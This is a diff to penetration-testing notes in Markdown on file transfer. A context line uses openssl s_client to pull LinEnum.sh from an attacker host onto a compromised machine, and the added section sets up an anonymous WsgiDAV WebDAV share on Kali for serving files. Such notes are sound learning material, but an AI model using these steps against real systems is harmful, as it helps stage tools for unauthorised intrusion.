@@ -207,3 +207,27 @@ Next, with the server running, we need to download the file from the compromised
 ```shell-session
 openssl s_client -connect $ipAttacker:$portAttacker -quiet > LinEnum.sh
 ```
+
+
+## WsgiDAV, a webdavserver
+
+we'll first set up a WebDAV share on our Kali system. We'll use [_WsgiDAV_](https://wsgidav.readthedocs.io/en/latest/index.html) as the WebDAV server to host and serve our files. We can use **pip3** to install WsgiDAV:
+
+```bash
+pip3 install wsgidav
+```
+
+Create the /home/kali/webdav directory to use as the WebDAV share:
+
+```bash
+mkdir /home/kali/webdav
+```
+
+Serve a file:
+
+```bash
+touch /home/kali/webdav/test.txt
+
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ 
+```
+
